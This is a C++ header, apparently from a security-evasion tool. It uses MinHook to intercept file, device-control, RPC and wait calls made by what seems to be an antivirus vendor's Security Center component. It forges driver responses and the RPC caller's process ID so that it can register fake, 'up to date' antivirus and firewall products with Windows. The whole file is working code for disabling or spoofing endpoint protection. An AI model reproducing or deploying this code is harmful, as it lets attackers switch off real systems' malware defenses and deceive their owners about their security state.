#pragma once
#include <cassert>

#include <algorithm>
#include <fstream>
#include <mutex>
#include <string>

#include "ctx.hpp"
#include "globals.hpp"
#include "MinHook.h"

#if defined(NDEBUG)
    #undef assert // thx msvc stl for the superior optimizations
    #define assert(expression) ((void)(expression))
#endif

namespace hooks {
    namespace original {
        inline decltype(&::CreateFileW) CreateFileW = nullptr;
        inline decltype(&::DeviceIoControl) DeviceIoControl = nullptr;
        inline decltype(&::I_RpcBindingInqLocalClientPID) I_RpcBindingInqLocalClientPID = nullptr;
        inline decltype(&::WaitForSingleObject) WaitForSingleObject = nullptr;
        inline void* ProceedQueue = nullptr;
        inline void* ProcessItem = nullptr;
    } // namespace original

    namespace hooked {
        std::uintptr_t ProceedQueue() {
            auto push_payload = [](const shared::e_product product, const std::wstring& internal_name) -> void {
                if ((globals::init_ctx.product & product) == shared::e_product::NONE) {
                    return;
                }

                auto payload = std::format(L"/svc /update /{} /state:{} /signatures:up_to_date", internal_name, globals::init_ctx.state);
                globals::ctx.s_wscrpc_update(payload.data(), true);
            };

            push_payload(shared::e_product::AV, L"av_as");
            push_payload(shared::e_product::FIREWALL, L"firewall");

            const auto result = reinterpret_cast<decltype(&ProceedQueue)>(original::ProceedQueue)();
            std::exit(0); // just in case we didn't exit through the `WaitForSingleObject` hook
            return result;
        }

        std::uintptr_t ProcessItem(std::uintptr_t pthis) {
            globals::processed = false;
            auto result = reinterpret_cast<decltype(&ProcessItem)>(original::ProcessItem)(pthis);
            globals::processed = true;
            return result;
        }

        HANDLE WINAPI CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
                                  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
            auto file_path = std::wstring(lpFileName);

            std::ranges::transform(file_path.begin(), file_path.end(), file_path.begin(),
                                   [](const auto ch) -> wchar_t { return static_cast<wchar_t>(std::tolower(static_cast<int>(ch))); });

            if (file_path.find(L"asw") != std::wstring::npos) {
                static std::once_flag fl;
                std::call_once(fl, []() -> void {
                    globals::wsc_base = globals::detail::base();

                    MH_CreateHook(globals::ctx.proceed_queue, ProceedQueue, &original::ProceedQueue);
                    MH_CreateHook(globals::ctx.proceed_item, ProcessItem, &original::ProcessItem);
                    MH_EnableHook(nullptr);
                });

                return reinterpret_cast<HANDLE>(1337);
            }

            return original::CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes,
                                         hTemplateFile);
        }

        BOOL WINAPI DeviceIoControl(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer,
                                    DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped) {
            const auto ret =
                original::DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped);

            if (reinterpret_cast<uint64_t>(hDevice) != 1337) {
                return ret;
            }

            switch (dwIoControlCode) {
            case 0xB2D601C0:
                return TRUE;
            case 0xB2D600CC:
                *reinterpret_cast<int*>(lpOutBuffer) = 1;
                return TRUE;
            case 0xb2d60190:
                *reinterpret_cast<int*>(lpOutBuffer) = 1337;
                *reinterpret_cast<int*>(lpBytesReturned) = 4;
                return TRUE;
            default:
                return ret;
            }
        }

        RPC_STATUS RPC_ENTRY I_RpcBindingInqLocalClientPID(RPC_BINDING_HANDLE Binding, unsigned long* Pid) {
            *Pid = GetCurrentProcessId();
            return 0;
        }

        DWORD WINAPI WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
            if (globals::wsc_base != 0 && hHandle == *globals::ctx.queue_handle) {
                if (globals::processed) {
                    std::exit(0);
                }
            }

            return original::WaitForSingleObject(hHandle, dwMilliseconds);
        }
    } // namespace hooked

    namespace detail {
        template <typename Ty>
        [[nodiscard]] MH_STATUS create_hook(Ty function, Ty detour, Ty* original) {
            return MH_CreateHook(function, detour, reinterpret_cast<void**>(original));
        }
    } // namespace detail

    inline void setup() {
        using namespace detail;

        assert(MH_Initialize() == MH_OK);
        assert(create_hook(::CreateFileW, hooked::CreateFileW, &original::CreateFileW) == MH_OK);
        assert(create_hook(::DeviceIoControl, hooked::DeviceIoControl, &original::DeviceIoControl) == MH_OK);
        assert(create_hook(::I_RpcBindingInqLocalClientPID, hooked::I_RpcBindingInqLocalClientPID, &original::I_RpcBindingInqLocalClientPID) == MH_OK);
        assert(create_hook(::WaitForSingleObject, hooked::WaitForSingleObject, &original::WaitForSingleObject) == MH_OK);
        assert(MH_EnableHook(MH_ALL_HOOKS) == MH_OK);
    }
} // namespace hooks
